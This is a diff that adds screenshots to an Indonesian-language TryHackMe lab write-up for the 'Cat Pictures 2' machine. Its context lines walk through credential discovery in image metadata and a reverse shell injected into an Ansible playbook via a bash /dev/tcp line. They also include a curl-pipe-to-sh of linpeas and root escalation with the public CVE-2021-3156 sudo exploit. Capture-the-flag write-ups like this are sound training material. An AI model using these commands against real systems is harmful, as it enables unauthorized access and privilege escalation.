@@ -110,48 +110,74 @@ Nmap done: 1 IP address (1 host up) scanned in 119.72 seconds
 ## Content Discovery
 - Buka halaman web `http://<IP_machine>` di browser
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%201.JPG)
+
 - Buka album public
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%202.JPG)
 
 - Setelah itu klik gambar pertama dan klik about. Disini terdapat indikasi bahwa didalam gambar tersebut terdapat sebuah note. Jadi kita akan download gambar ini
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%203.png)
+
 - Klik tombol share dan pilih Direct Link
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%204.jpg)
+
 - Maka akan diarahkan ke url gambar
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%205.JPG)
 
 - Copy link gambar tersebut kemudian download menggunakan tool `wget`
 ```sh
 wget http://<IP_machine>/uploads/big/f5054e97620f168c7b5088c85ab1d6e4.jpg 
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%206.JPG)
+
 - Gunakan `exiftool` untuk memeriksanya
 ```sh
 exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg 
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%207.JPG)
+
 - Sekarang kita buka url `http://IP_machine:8080/764efa883dda1e11db47671c4a3bbd9e.txt` di browser. Disini terdapat informasi username dan password untuk mengakses gitea dan terdapat halaman ansible yang berada di port 1337
 
-
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%208.JPG)
 
 ## Gain Access
 - Buka url `http://<IP_machine>:3000` di browser lalu klik **Sign in**
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%209.JPG)
 
 - Login dengan username dan password yang sudah tersedia
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2010.JPG)
 
 - Setelah login berhasil klik tautan repository
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2011.jpg)
 
 - Disini kita berhasil menemukan flag pertama yaitu file **flag1.txt**
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2012.JPG)
+
 - Double klik file tersebut untuk membukanya
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2013.JPG)
 
 - Sekarang kita buka halaman ansible dengan url `http://<IP_machine>:1337` di tab baru. Disini terdapat menu **Run Ansible Playbook**
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2014.JPG)
+
 - Jika kita lihat isi file **playbook.yaml** berisi command **whoami**
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2015.JPG)
 
 - Klik menu **Run Ansible Playbook** kemudian tunggu hingga proses eksekusi selesai. Setelah itu pindah ke tab **Logs** maka di keterangan **stdout** tertulis **bismuth** yang merupakan nama user saat ini
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2016.JPG)
 
 - Dari sini kita bisa menyisipkan reverse shell ke file **playbook.yaml** di gitea kemudian menjalankannya dengan menu **Run Ansible Playbook** di halaman ansible
 - Pertama-tama kita buat sebuah listener diterminal sebagai berikut
@@ -159,25 +185,37 @@ exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg
 nc -lnvp <port>
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2017.JPG)
+
 - Edit file **playbook.yaml**
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2018.png)
 
 - Sisipan reverse shell pada bagian command dan sesuaikan dengan IP di komputer anda
 ```sh
 bash -c "bash -i >& /dev/tcp/IP_tun0/9000 0>&1"
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2019.JPG)
+
 - Isi keterangan commit dengan "Update" lalu tekan tombol Commit Changes untuk menyimpan perubahan
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2020.JPG)
 
 - Klik menu **Run Ansible Playbook** untuk menjalankan
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2021.jpg)
 
 - Netcat berhasil terkoneksi dan masuk sebagai bismuth
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2022.JPG)
 
 - Kita berhasil menemukan file **flag2.txt** di path **/home/bismuth**
 ```sh
 cat /home/bismuth/flag2.txt
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2023.JPG)
 
 ## Privilege Escalation
 - Download file linpeas.sh di https://github.com/carlospolop/PEASS-ng/releases di local
@@ -186,12 +224,18 @@ cat /home/bismuth/flag2.txt
 python3 -m http.server 80
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2024.JPG)
+
 - Download dan eksekusi file tersebut dengan curl di server
 ```sh
 curl -L http://IP_tun0/linpeas.sh | sh
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2025.JPG)
+
 - Disini terdapat informasi bahwa server menggunakan sudo versi 1.8.21p2
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2026.JPG)
 
 - Kita dapat memanfaatkan script di https://github.com/blasty/CVE-2021-3156 untuk mengeskalasi user root
 - Download file tersebut ke local dengan git clone
@@ -199,15 +243,21 @@ curl -L http://IP_tun0/linpeas.sh | sh
 git clone https://github.com/blasty/CVE-2021-3156.git
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2027.JPG)
+
 - Zip file tersebut dengan tar
 ```sh
 tar -cvf exploit.tar CVE-2021-3156
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2028.JPG)
+
 - Serving file zip tersebut dengan python3
 ```sh
 python3 -m http.server 80
 ```
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2029.JPG)
 
 - Download dan ekstrak zip tersebut ke server
 ```sh
@@ -216,11 +266,15 @@ wget http://IP_tun0/exploit.tar
 tar xopf exploit.tar
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2030.JPG)
+
 - Build file tersebut
 ```sh
 cd CVE-2021-3156
 make
 ```
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2031.JPG)
 
 - Eksekusi executable file yang berhasil dibuat untuk mendapatkan akses root
 ```sh
@@ -228,12 +282,14 @@ make
 ./sudo-hax-me-a-sandwich 0
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2032.JPG)
+
 - Buka file **flag3.txt** yang berada di directory root
 ```sh
 cat /root/flag3.txt
 ```
 
-
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2033.JPG)
 
 ## Task 2 Flags!
 
